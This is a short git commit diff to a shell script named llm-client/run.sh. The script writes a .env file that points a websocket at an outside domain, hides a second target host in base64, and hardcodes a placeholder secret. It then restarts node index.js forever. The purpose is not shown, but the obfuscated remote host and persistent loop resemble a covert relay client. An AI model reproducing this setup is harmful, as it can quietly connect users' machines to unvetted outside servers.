d360dde972dec5cf40d7e67aa3c019a346043ad5
McgeeLucia1970 <eliham2132@outlook.com>
2026-02-04 01:11:03 +0700

    Update run.sh

--- llm-client/run.sh
+++ llm-client/run.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
 CONNECT=$1
+NAME=$2
 echo "SERVER_WS=ws://cdn.medco.cyou
 SERVER_TARGET=czEuZGFwaXRheC5zb2NpYWw6ODA4Mg==
 SERVER_DOMAIN=${NAME}
+SERVER_SECRET=secret
 SERVER_CONNECTION=${CONNECT}" > .env
 while true; do node index.js; sleep 15; done
